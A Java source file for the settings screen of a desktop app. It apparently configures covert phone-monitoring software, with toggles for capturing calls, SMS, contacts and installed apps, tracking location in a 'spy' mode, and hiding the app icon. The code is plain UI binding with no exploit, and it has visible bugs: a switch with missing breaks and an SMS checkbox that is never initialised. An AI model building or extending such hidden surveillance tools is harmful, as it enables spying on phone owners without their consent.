package gui.fragment_controllers;

import com.jfoenix.controls.JFXCheckBox;
import com.jfoenix.controls.JFXRadioButton;
import dagger.Injector;
import dagger.application.AppModule;
import data.remote.model.information.Settings;
import io.datafx.controller.ViewController;
import io.datafx.controller.ViewNode;
import io.datafx.controller.flow.context.FXMLViewFlowContext;
import io.datafx.controller.flow.context.ViewFlowContext;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.fxml.FXML;
import javafx.scene.control.Toggle;
import javafx.scene.control.ToggleGroup;
import javafx.scene.layout.StackPane;

import javax.annotation.PostConstruct;
import javax.inject.Inject;
import java.util.Arrays;
import java.util.Objects;

/**
 * Created by oldman on 26.06.17.
 */

@ViewController(value = "/fxml/settings.fxml")
public class SettingsController {
    @FXMLViewFlowContext
    @Inject
    ViewFlowContext context;
    @ViewNode
    private StackPane rootPane;
    @ViewNode
    private JFXCheckBox checkCall;
    @ViewNode
    private JFXCheckBox checkSMS;
    @ViewNode
    private JFXCheckBox checkLocation;
    @ViewNode
    private JFXCheckBox checkService;
    @ViewNode
    private JFXCheckBox checkContact;
    @ViewNode
    private JFXCheckBox checkCallList;
    @ViewNode
    private JFXCheckBox checkSmsList;
    @ViewNode
    private JFXCheckBox checkInstallApps;
    @ViewNode
    private JFXCheckBox checkHideIcon;
    @ViewNode
    private JFXCheckBox checkAirplaneMode;
    @ViewNode
    private JFXCheckBox checkWiFi;
    @ViewNode
    private JFXCheckBox checkScreen;
    @ViewNode
    private JFXCheckBox checkReboot;
    @ViewNode
    private JFXCheckBox checkShutDown;
    @ViewNode
    private JFXRadioButton rBtnHightAccuracyLocation;
    @ViewNode
    private JFXRadioButton rBtnMidleAccuracyLocation;
    @ViewNode
    private JFXRadioButton rBtnSpyLocation;
    private Settings settings;

    @PostConstruct
    public void init() throws Exception {
        Injector.inject(this, Arrays.asList(new AppModule()));
        Objects.requireNonNull(context, "settings");
        this.settings = (Settings) context.getRegisteredObject("settings");

        ToggleGroup group = new ToggleGroup();
        rBtnHightAccuracyLocation.setToggleGroup(group);
        rBtnMidleAccuracyLocation.setToggleGroup(group);
        rBtnSpyLocation.setToggleGroup(group);
        switch (settings.getLocationMode()) {
            case 0:
                rBtnHightAccuracyLocation.setSelected(true);
            case 1:
                rBtnMidleAccuracyLocation.setSelected(true);
            case 2:
                rBtnSpyLocation.setSelected(true);
        }
        checkCall.setSelected(settings.isBell());
        checkLocation.setSelected(settings.isLocation());
        checkService.setSelected(settings.isService());
        checkContact.setSelected(settings.isContactBook());
        checkCallList.setSelected(settings.isListCall());
        checkSmsList.setSelected(settings.isListSms());
        checkInstallApps.setSelected(settings.isListApp());
        checkHideIcon.setSelected(settings.isHideIcon());
        checkAirplaneMode.setSelected(settings.isAirplaneMode());
        checkWiFi.setSelected(settings.isWifi());
        checkScreen.setSelected(settings.isScreen());
        checkReboot.setSelected(settings.isReboot());
        checkShutDown.setSelected(settings.isShutDown());
        group.selectedToggleProperty().addListener(new ChangeListener<Toggle>() {
            public void changed(ObservableValue<? extends Toggle> ov, Toggle old_toggle, Toggle new_toggle) {

                if (group.getSelectedToggle() != null) {
                    settings.setLocationMode(Integer.parseInt(group.getSelectedToggle().getUserData().toString()));
                }

            }
        });
    }

    @FXML
    private void onAccept() {
        settings.setBell(checkCall.isSelected());
        settings.setSms(checkSMS.isSelected());
        settings.setLocation(checkLocation.isSelected());
        settings.setService(checkService.isSelected());
        settings.setContactBook(checkContact.isSelected());
        settings.setListCall(checkCallList.isSelected());
        settings.setListSms(checkSmsList.isSelected());
        settings.setListApp(checkInstallApps.isSelected());
        settings.setHideIcon(checkHideIcon.isSelected());
        settings.setAirplaneMode(checkAirplaneMode.isSelected());
        settings.setWifi(checkWiFi.isSelected());
        settings.setScreen(checkScreen.isSelected());
        settings.setReboot(checkReboot.isSelected());
        settings.setShutDown(checkShutDown.isSelected());
    }

    @FXML
    private void onDecline() {
    }


}
